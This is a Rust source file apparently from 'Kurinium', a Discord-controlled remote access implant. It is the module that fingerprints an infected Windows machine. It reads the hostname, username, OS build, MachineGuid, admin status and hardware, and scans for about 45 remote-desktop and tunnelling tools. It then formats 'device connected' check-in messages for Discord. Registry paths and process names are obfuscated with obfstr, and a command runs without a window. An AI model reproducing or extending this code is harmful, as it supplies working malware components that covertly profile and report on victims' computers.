use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;
use sysinfo::{CpuExt, DiskExt, System, SystemExt, ProcessExt, PidExt};

const PROJECT_FOOTER: &str = "-# Kurinium: https://github.com/Mikasuru/Kurinium";

// Remote Desktop Applications to detect
fn get_remote_desktop_apps() -> Vec<(String, &'static str)> {
    vec![
        // Remote Access Tools
        (obfstr::obfstr!("anydesk.exe").to_string(), "AnyDesk"),
        (obfstr::obfstr!("teamviewer.exe").to_string(), "TeamViewer"),
        (obfstr::obfstr!("teamviewer_service.exe").to_string(), "TeamViewer Service"),
        (obfstr::obfstr!("tv_w32.exe").to_string(), "TeamViewer"),
        (obfstr::obfstr!("tv_x64.exe").to_string(), "TeamViewer"),
        (obfstr::obfstr!("rustdesk.exe").to_string(), "RustDesk"),
        (obfstr::obfstr!("supremo.exe").to_string(), "Supremo"),
        (obfstr::obfstr!("supremoservice.exe").to_string(), "Supremo Service"),
        (obfstr::obfstr!("ammyy_admin.exe").to_string(), "Ammyy Admin"),
        (obfstr::obfstr!("aa_v3.exe").to_string(), "Ammyy Admin"),
        (obfstr::obfstr!("radmin.exe").to_string(), "Radmin"),
        (obfstr::obfstr!("rserver3.exe").to_string(), "Radmin Server"),
        (obfstr::obfstr!("uvnc_service.exe").to_string(), "UltraVNC"),
        (obfstr::obfstr!("winvnc.exe").to_string(), "UltraVNC"),
        (obfstr::obfstr!("vncviewer.exe").to_string(), "VNC Viewer"),
        (obfstr::obfstr!("tvnserver.exe").to_string(), "TightVNC"),
        (obfstr::obfstr!("tvnviewer.exe").to_string(), "TightVNC Viewer"),
        (obfstr::obfstr!("screenconnect.clientservice.exe").to_string(), "ScreenConnect"),
        (obfstr::obfstr!("screenconnect.windowsclient.exe").to_string(), "ScreenConnect"),
        (obfstr::obfstr!("connectwisecontrol.client.exe").to_string(), "ConnectWise Control"),
        (obfstr::obfstr!("bomgar-scc.exe").to_string(), "Bomgar/BeyondTrust"),
        (obfstr::obfstr!("splashtop.exe").to_string(), "Splashtop"),
        (obfstr::obfstr!("strwinclt.exe").to_string(), "Splashtop Streamer"),
        (obfstr::obfstr!("srservice.exe").to_string(), "Splashtop Service"),
        (obfstr::obfstr!("logmein.exe").to_string(), "LogMeIn"),
        (obfstr::obfstr!("lmiguardiansvc.exe").to_string(), "LogMeIn"),
        (obfstr::obfstr!("remotepc.exe").to_string(), "RemotePC"),
        (obfstr::obfstr!("remotepchostuisvc.exe").to_string(), "RemotePC Service"),
        (obfstr::obfstr!("dwservice.exe").to_string(), "DWService"),
        (obfstr::obfstr!("dwagent.exe").to_string(), "DWAgent"),
        (obfstr::obfstr!("parsec.exe").to_string(), "Parsec"),
        (obfstr::obfstr!("parsecd.exe").to_string(), "Parsec Daemon"),
        (obfstr::obfstr!("nomachine.exe").to_string(), "NoMachine"),
        (obfstr::obfstr!("nxd.exe").to_string(), "NoMachine Daemon"),
        (obfstr::obfstr!("chrome_remote_desktop.exe").to_string(), "Chrome Remote Desktop"),
        (obfstr::obfstr!("remoting_host.exe").to_string(), "Chrome Remote Desktop"),
        // Windows Built-in
        (obfstr::obfstr!("mstsc.exe").to_string(), "Remote Desktop Client"),
        (obfstr::obfstr!("msra.exe").to_string(), "Remote Assistance"),
        (obfstr::obfstr!("termsrv.exe").to_string(), "Remote Desktop Services"),
        // Other Tools
        (obfstr::obfstr!("ngrok.exe").to_string(), "Ngrok"),
        (obfstr::obfstr!("cloudflared.exe").to_string(), "Cloudflare Tunnel"),
        (obfstr::obfstr!("tailscale.exe").to_string(), "Tailscale"),
        (obfstr::obfstr!("zerotier-one.exe").to_string(), "ZeroTier"),
        (obfstr::obfstr!("hamachi-2.exe").to_string(), "Hamachi"),
        (obfstr::obfstr!("hamachi-2-ui.exe").to_string(), "Hamachi UI"),
    ]
}


fn format_uptime(seconds: u64) -> String {
    let mut remaining = seconds;
    let days = remaining / 86_400;
    remaining %= 86_400;
    let hours = remaining / 3_600;
    remaining %= 3_600;
    let minutes = remaining / 60;
    let seconds = remaining % 60;

    let mut parts = Vec::new();
    if days > 0 {
        parts.push(format!("{}d", days));
    }
    if hours > 0 {
        parts.push(format!("{}h", hours));
    }
    if minutes > 0 {
        parts.push(format!("{}m", minutes));
    }
    if seconds > 0 || parts.is_empty() {
        parts.push(format!("{}s", seconds));
    }

    parts.join(" ")
}

fn summarize(text: &str, max_len: usize) -> String {
    if text.len() <= max_len {
        return text.to_string();
    }

    let keep = max_len.saturating_sub(3);
    if keep == 0 {
        return "...".to_string();
    }

    let front = keep / 2;
    let back = keep - front;
    format!("{}...{}", &text[..front], &text[text.len() - back..])
}

fn windows_version_display() -> Option<String> {
    use winreg::enums::HKEY_LOCAL_MACHINE;
    use winreg::RegKey;

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let key = hklm
        .open_subkey(obfstr::obfstr!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"))
        .ok()?;

    let product_name: String = key.get_value("ProductName").unwrap_or_default();
    if product_name.is_empty() {
        return None;
    }

    let display_version: String = key
        .get_value("DisplayVersion")
        .or_else(|_| key.get_value("ReleaseId"))
        .unwrap_or_default();
    let build_number: String = key.get_value("CurrentBuild").unwrap_or_default();
    let build_revision: u32 = key.get_value("UBR").unwrap_or(0);
    let is_win11 = build_number.parse::<u32>().unwrap_or(0) >= 22000;

    let fixed_product_name = if is_win11 && product_name.contains("Windows 10") {
        product_name.replace("Windows 10", "Windows 11")
    } else {
        product_name
    };

    let build = if !build_number.is_empty() {
        if build_revision > 0 {
            format!("{}.{}", build_number, build_revision)
        } else {
            build_number.clone()
        }
    } else {
        String::new()
    };

    if !display_version.is_empty() && !build.is_empty() {
        Some(format!(
            "{} {} (Build {})",
            fixed_product_name, display_version, build
        ))
    } else if !build.is_empty() {
        Some(format!("{} (Build {})", fixed_product_name, build))
    } else if !display_version.is_empty() {
        Some(format!("{} {}", fixed_product_name, display_version))
    } else {
        Some(fixed_product_name)
    }
}

// Remote Desktop Detection
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RemoteConnection {
    pub name: String,
    pub display_name: String,
    pub pid: u32,
}

pub fn detect_remote_connections() -> Vec<RemoteConnection> {
    use crate::utils::syscall;
    
    let mut connections = Vec::new();
    let processes = syscall::get_process_list();

    for (pid, name) in processes {
        let proc_name = name.to_lowercase();
        for (exe_name, display_name) in get_remote_desktop_apps() {
            if proc_name == exe_name {
                connections.push(RemoteConnection {
                    name: name.clone(),
                    display_name: display_name.to_string(),
                    pid,
                });
                break;
            }
        }
    }

    connections.sort_by(|a, b| a.display_name.cmp(&b.display_name));
    connections.dedup_by(|a, b| a.display_name == b.display_name && a.name == b.name);
    connections
}

fn format_remote_connections(connections: &[RemoteConnection]) -> String {
    if connections.is_empty() {
        return "```\nNo remote desktop applications detected\n```".to_string();
    }

    let mut lines = Vec::new();
    for conn in connections {
        lines.push(format!("{:<30} | PID: {}", conn.display_name, conn.pid));
    }

    format!("```\n{}\n```", lines.join("\n"))
}

fn check_rdp_session() -> Option<String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    
    let output = Command::new("query")
        .args(["session"])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()
        .ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    
    let mut rdp_sessions = Vec::new();
    for line in stdout.lines() {
        if line.contains("rdp-tcp") && line.contains("Active") {
            rdp_sessions.push(line.trim().to_string());
        }
    }

    if rdp_sessions.is_empty() {
        None
    } else {
        Some(rdp_sessions.join("\n"))
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeviceInfo {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub os_version: String,
    pub architecture: String,
    pub device_id: String,
    pub hardware_id: String,
    pub admin_status: bool,
    pub current_directory: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SystemInfo {
    pub os: String,
    pub kernel: String,
    pub hostname: String,
    pub cpu_name: String,
    pub cpu_cores: usize,
    pub memory_total: u64,
    pub memory_used: u64,
    pub disk_total: u64,
    pub disk_used: u64,
    pub uptime: u64,
}

impl SystemInfo {
    pub fn get_detailed_info() -> Result<SystemInfo> {
        let mut sys = System::new_all();
        sys.refresh_all();

        let os = match windows_version_display() {
            Some(details) => details,
            None => sys
                .long_os_version()
                .or_else(|| sys.os_version())
                .unwrap_or_else(|| std::env::consts::OS.to_string()),
        };

        let hostname = gethostname::gethostname().to_string_lossy().into_owned();

        let raw_total_memory = sys.total_memory();
        let raw_used_memory = sys.used_memory();
        let memory_multiplier = if raw_total_memory > (1u64 << 32) {
            1
        } else {
            1024
        };
        let total_memory = raw_total_memory.saturating_mul(memory_multiplier);
        let used_memory = raw_used_memory.saturating_mul(memory_multiplier);

        let cpu_cores = sys.physical_core_count().unwrap_or(sys.cpus().len());

        let mut total_disk: u64 = 0;
        let mut used_disk: u64 = 0;
        for disk in sys.disks() {
            total_disk = total_disk.saturating_add(disk.total_space());
            used_disk =
                used_disk.saturating_add(disk.total_space().saturating_sub(disk.available_space()));
        }

        Ok(SystemInfo {
            os,
            kernel: std::env::consts::ARCH.to_string(),
            hostname,
            cpu_name: sys.global_cpu_info().name().to_string(),
            cpu_cores,
            memory_total: total_memory,
            memory_used: used_memory,
            disk_total: total_disk,
            disk_used: used_disk,
            uptime: sys.uptime(),
        })
    }

    pub fn format_reconnection(&self, device: &DeviceInfo) -> String {
        let details = self.render_details(device);
        let connections = self.render_connections();
        format!(
            "# Device **{}** reconnected\n{}\n{}\n{}",
            device.username, details, connections, PROJECT_FOOTER
        )
    }

    pub fn format_for_discord(&self, device: &DeviceInfo) -> String {
        let details = self.render_details(device);
        let connections = self.render_connections();
        format!(
            "# Device **{}** is now connected\n{}\n{}\n{}",
            device.username, details, connections, PROJECT_FOOTER
        )
    }

    fn render_details(&self, device: &DeviceInfo) -> String {
        let uptime = format_uptime(self.uptime);
        let current_dir = summarize(&device.current_directory, 50);

        let mem_used_mb = self.memory_used / (1024 * 1024);
        let mem_total_mb = self.memory_total / (1024 * 1024);
        let mem_percent = if self.memory_total > 0 {
            (self.memory_used as f64 / self.memory_total as f64) * 100.0
        } else {
            0.0
        };

        let os_display = &self.os;
        let kernel = get_build_number().unwrap_or_else(|| self.kernel.clone());
        let elevated = if device.admin_status { "Yes" } else { "No" };

        format!(
            r#"### System Information:
```
Hostname:      {}
Username:      {}
OS:            {}
Kernel:        {}
Architecture:  {}
Uptime:        {}
Memory:        {} MB / {} MB ({:.1}%)
CPU:           {}
CPU Cores:     {}

CWD:           {}
Elevated:      {}
```"#,
            device.hostname,
            device.username,
            os_display,
            kernel,
            device.architecture,
            uptime,
            mem_used_mb,
            mem_total_mb,
            mem_percent,
            self.cpu_name,
            self.cpu_cores,
            current_dir,
            elevated
        )
    }

    fn render_connections(&self) -> String {
        let remote_apps = detect_remote_connections();
        let rdp_session = check_rdp_session();

        let mut sections = Vec::new();
        if !remote_apps.is_empty() {
            let apps_text = remote_apps
                .iter()
                .map(|c| format!("{:<30} | PID: {}", c.display_name, c.pid))
                .collect::<Vec<_>>()
                .join("\n");
            sections.push(format!("```\n{}\n```", apps_text));
        }

        if let Some(rdp) = rdp_session {
            sections.push(format!("**Active RDP Session:**\n```\n{}\n```", rdp));
        }

        if sections.is_empty() {
            "### Connections:\n```\nNo remote desktop applications detected\n```".to_string()
        } else {
            format!("### Connections:\n{}", sections.join("\n"))
        }
    }
}

fn get_build_number() -> Option<String> {
    use winreg::enums::HKEY_LOCAL_MACHINE;
    use winreg::RegKey;

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let key = hklm
        .open_subkey(obfstr::obfstr!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"))
        .ok()?;
    let build: String = key.get_value("CurrentBuild").ok()?;
    Some(build)
}

impl DeviceInfo {
    pub fn new() -> Result<Self> {
        let hostname = gethostname::gethostname().to_string_lossy().into_owned();

        let username = std::env::var("USERNAME")
            .or_else(|_| std::env::var("USER"))
            .unwrap_or_else(|_| "unknown".to_string());

        let os_version =
            windows_version_display().unwrap_or_else(|| std::env::consts::OS.to_string());
        let architecture = std::env::consts::ARCH.to_string();

        let device_id = Self::generate_device_id()?;

        Ok(DeviceInfo {
            hostname,
            username,
            os: os_version.clone(),
            os_version,
            architecture,
            device_id: device_id.clone(),
            hardware_id: device_id,
            admin_status: Self::is_admin(),
            current_directory: std::env::current_dir()
                .unwrap_or_else(|_| Path::new("").to_path_buf())
                .to_string_lossy()
                .to_string(),
        })
    }

    fn generate_device_id() -> Result<String> {
        use winreg::enums::HKEY_LOCAL_MACHINE;
        use winreg::RegKey;

        if let Ok(key) =
            RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(obfstr::obfstr!("SOFTWARE\\Microsoft\\Cryptography"))
        {
            let value: String = key
                .get_value("MachineGuid")
                .map_err(|e| anyhow!("Failed to read MachineGuid: {e}"))?;
            let trimmed = value.trim();
            if !trimmed.is_empty() {
                return Ok(trimmed.to_string());
            }
        }

        Ok("unknown-device".to_string())
    }

    // Use shared admin check from utils
    fn is_admin() -> bool {
        crate::utils::admin::is_admin()
    }
}